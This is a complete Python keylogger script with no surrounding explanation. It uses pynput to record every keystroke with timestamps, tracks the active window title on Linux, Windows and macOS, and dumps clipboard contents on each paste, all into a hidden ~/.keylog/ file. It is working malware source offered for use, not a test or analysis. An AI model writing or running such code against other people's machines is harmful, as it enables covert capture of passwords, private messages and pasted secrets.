from pynput import keyboard
from datetime import datetime
import pyperclip
import os
import platform
import subprocess
import sys

# Setup log file path
log_dir = os.path.expanduser("~/.keylog/")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "keylog.txt")

current_window = None
ctrl_pressed = False

def get_active_window():
    try:
        system = platform.system()
        if system == 'Linux':
            output = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname'])
            return output.decode().strip()
        elif system == 'Windows':
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif system == 'Darwin':
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        else:
            return "Unknown OS"
    except Exception as e:
        return f"Unknown Window: {e}"

def write_log(text):
    with open(log_file, "a") as f:
        f.write(text + "\n")

def log_clipboard():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        pasted = pyperclip.paste()
        write_log(f"[{timestamp}] [PASTE] - {pasted}")
    except Exception:
        write_log(f"[{timestamp}] [PASTE] - (Clipboard Unreadable)")

def on_press(key):
    global current_window, ctrl_pressed

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()

    if active_window != current_window:
        current_window = active_window
        write_log(f"[{timestamp}] [Window: {current_window}]")

    try:
        if hasattr(key, 'char') and key.char:
            write_log(f"[{timestamp}] {key.char}")
        else:
            write_log(f"[{timestamp}] [{key}]")
    except Exception as e:
        write_log(f"[{timestamp}] [Error Logging Key] - {e}")

    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.cmd):
        ctrl_pressed = True

    elif ctrl_pressed and hasattr(key, 'char') and key.char.lower() == 'v':
        log_clipboard()
        ctrl_pressed = False

def on_release(key):
    global ctrl_pressed

    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.cmd):
        ctrl_pressed = False

    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start keylogger
print("[*] Starting Keylogger. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
